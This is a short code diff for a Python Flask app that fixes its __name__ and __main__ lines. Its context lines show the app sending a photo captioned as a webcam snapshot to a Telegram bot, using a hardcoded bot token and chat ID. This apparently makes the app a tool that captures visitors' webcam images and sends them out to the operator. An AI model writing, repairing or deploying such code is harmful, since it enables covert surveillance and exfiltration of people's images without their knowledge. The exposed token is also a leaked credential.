@@ -2,7 +2,7 @@ import os
 from flask import Flask, render_template, request, jsonify
 import requests
 
-app = Flask(name)
+app = Flask(__name__)
 
 BOT_TOKEN = "8805942390:AAGdY9nKFMg3zqPzrJQHwmsufrS5QvYgthk"
 CHAT_ID = "1454432576"
@@ -27,5 +27,5 @@ data_payload = {"chat_id": CHAT_ID, "caption": f"📸 Снимок с вебка
 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data=data_payload, files=files)
 return jsonify({"status": "ok"})
 
-if name == 'main':
+if __name__ == '__main__':
 app.run(host='0.0.0.0', port=5000)
